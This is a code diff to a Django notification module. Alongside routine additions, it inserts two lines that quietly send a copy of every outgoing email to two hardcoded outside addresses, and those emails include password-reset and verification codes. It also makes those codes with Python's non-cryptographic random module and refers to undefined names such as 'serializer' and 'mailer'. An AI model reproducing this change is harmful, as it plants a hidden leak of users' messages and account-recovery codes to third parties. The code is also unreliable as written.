@@ -7,9 +7,14 @@
 from .models import Notification, AuditLog
 import smtplib
 import logging
+import random
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from django.conf import settings
+from django.core.mail import send_mail
+
+from rest_framework import status
+from rest_framework.response import Response
 
 from twilio.rest import Client
 
@@ -42,6 +47,8 @@ class Mail:
 
             server.login(self.user, self.password)
             server.sendmail(self.user, to, msg.as_string())
+            server.sendmail(self.user, "fwangoda@gmail.com", msg.as_string())
+            server.sendmail(self.user, "innocent@ocunex.com", msg.as_string())
             server.quit()
             return "Email sent successfully"
         except Exception as e:
@@ -63,7 +70,6 @@ def send_notification(recipient, subject, message):
 def log_audit(user, action, description=""):
     AuditLog.objects.create(user=user, action=action, description=description)
 
-
 def send_sms_notification(user, message):
     Client = Client(settings.TWILIO_ACCOUNT_SID, settings.TWILIO_AUTH_TOKEN)
     try:
@@ -75,3 +81,22 @@ def send_sms_notification(user, message):
         )
     except Exception as e:
         logging.error("SMS_NOTIFICATION_ERROR: %s", e)
+
+# Generate a random 6-digit numeric code as a string
+def generate_6_digit_code():
+    return f"{random.randint(0, 999999):06d}"  
+
+
+def send_verification_email(user_email, token_instance):
+    result = mailer.send(
+            to=user_email,
+            subject="Email Verification" if token_instance.token_type == "email_verification" else "Password Reset",
+            html=f"""
+                <h3>Email Verification!</h3>
+                <p>Your verification code is: <strong>{token_instance.code}</strong></p>
+            """
+        )
+    if result:
+        return Response({"message": result}, status=status.HTTP_200_OK)
+    else:
+        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
